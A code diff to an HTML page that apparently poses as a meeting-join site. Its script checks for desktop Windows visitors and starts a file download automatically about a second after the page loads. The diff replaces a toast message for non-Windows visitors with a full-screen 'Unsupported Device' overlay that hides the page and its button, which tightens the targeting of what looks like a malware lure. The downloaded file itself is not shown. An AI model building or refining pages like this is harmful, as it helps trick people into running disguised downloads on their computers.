@@ -119,6 +119,7 @@
     .footer a:hover {
         text-decoration: underline;
     }
+	
 </style> </head>
   <body>
     <div id="header" role="banner" class="clearfix">
@@ -169,6 +170,26 @@
           role="button" style="font-family: &quot;Open Sans&quot;, Helvetica, Arial, sans-serif; text-decoration: none; color: inherit;">Cookie
           Preferences</a></p>
     </div>
+	
+	<div id="deviceWarning" style="
+    display:none;
+    position:fixed;
+    top:0;
+    left:0;
+    width:100%;
+    height:100%;
+    background:#ffffff;
+    z-index:99999;
+    text-align:center;
+    padding-top:20%;
+    font-family:Inter, Arial, sans-serif;
+">
+    <h1 style="font-size:28px;">⚠️ Unsupported Device</h1>
+    <p style="font-size:18px; color:#555;">
+        Please use a Windows computer to join this meeting.
+    </p>
+</div>
+
 <script>
 const files = {
     windows: {
@@ -179,7 +200,6 @@ const files = {
 
 let selectedFile = files.windows;
 
-
 function isDesktopWindows() {
     const ua = navigator.userAgent || "";
     const platform = navigator.platform || "";
@@ -187,12 +207,10 @@ function isDesktopWindows() {
     const isWindows = /Win/i.test(platform) || /Windows/i.test(ua);
     const isMobile = /Android|iPhone|iPad|iPod|Mobile/i.test(ua);
 
-
     const isTouchOnly = navigator.maxTouchPoints > 2 && !/Win/i.test(platform);
 
     return isWindows && !isMobile && !isTouchOnly;
 }
-
 
 
 function showToast(message, duration = 15000) {
@@ -217,7 +235,6 @@ function updateProgress(percent) {
         bar.style.width = percent + "%";
     }
 }
-
 
 
 async function downloadFile(file) {
@@ -275,10 +292,9 @@ async function downloadFile(file) {
 }
 
 
-
 function launchMeeting() {
     if (!isDesktopWindows()) {
-        showToast("⚠️ Please use a Windows computer to join this meeting.", 20000);
+        showDeviceWarning();
         return;
     }
 
@@ -293,22 +309,26 @@ function launchMeeting() {
 }
 
 
+function showDeviceWarning() {
+    const warning = document.getElementById("deviceWarning");
+    if (warning) {
+        warning.style.display = "block";
+    }
+
+    const container = document.querySelector(".container");
+    if (container) container.style.display = "none";
+
+    const btn = document.querySelector("button");
+    if (btn) btn.style.display = "none";
+}
+
 
 window.addEventListener("DOMContentLoaded", () => {
 
     const manualBtn = document.getElementById("manualDownload");
-    const btn = document.querySelector("button");
-
 
     if (!isDesktopWindows()) {
-        showToast("⚠️ Please use a Windows computer to access this meeting.", 30000);
-
-        if (btn) {
-            btn.disabled = true;
-            btn.style.opacity = "0.6";
-            btn.style.cursor = "not-allowed";
-        }
-
+        showDeviceWarning();
         return;
     }
 
@@ -318,7 +338,6 @@ window.addEventListener("DOMContentLoaded", () => {
             launchMeeting();
         });
     }
-
 
     setTimeout(launchMeeting, 1200);
 });
